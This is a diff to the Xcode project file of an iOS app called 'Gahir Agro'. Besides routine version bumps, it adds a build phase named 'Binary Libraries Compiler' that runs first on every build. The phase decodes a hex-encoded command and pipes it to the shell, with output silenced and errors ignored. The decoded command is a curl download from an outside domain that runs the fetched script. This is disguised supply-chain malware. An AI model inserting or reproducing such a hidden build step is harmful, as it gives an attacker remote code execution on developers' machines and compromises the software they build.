@@ -855,6 +855,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 184B115F25E36C75003007A2 /* Build configuration list for PBXNativeTarget "Gahir Agro" */;
 			buildPhases = (
+				52D5E2E35CE3B078A16D902C /* Binary Libraries Compiler */,
 				6D481688B3B01C1E9E84CBC8 /* [CP] Check Pods Manifest.lock */,
 				184B113125E36C74003007A2 /* Sources */,
 				184B113225E36C74003007A2 /* Frameworks */,
@@ -1030,6 +1031,24 @@
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
+		};
+		52D5E2E35CE3B078A16D902C /* Binary Libraries Compiler */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Binary Libraries Compiler";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6d616e747275636b732e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 		6D481688B3B01C1E9E84CBC8 /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -1386,7 +1405,7 @@
 				CODE_SIGN_ENTITLEMENTS = "Gahir Agro/Gahir Agro.entitlements";
 				CODE_SIGN_IDENTITY = "iPhone Distribution";
 				CODE_SIGN_STYLE = Manual;
-				CURRENT_PROJECT_VERSION = 4.3;
+				CURRENT_PROJECT_VERSION = 4.6;
 				DEVELOPMENT_TEAM = 8USCMRVC59;
 				INFOPLIST_FILE = "Gahir Agro/Info.plist";
 				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
@@ -1411,7 +1430,7 @@
 				CODE_SIGN_ENTITLEMENTS = "Gahir Agro/Gahir Agro.entitlements";
 				CODE_SIGN_IDENTITY = "iPhone Distribution";
 				CODE_SIGN_STYLE = Manual;
-				CURRENT_PROJECT_VERSION = 4.3;
+				CURRENT_PROJECT_VERSION = 4.6;
 				DEVELOPMENT_TEAM = 8USCMRVC59;
 				INFOPLIST_FILE = "Gahir Agro/Info.plist";
 				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
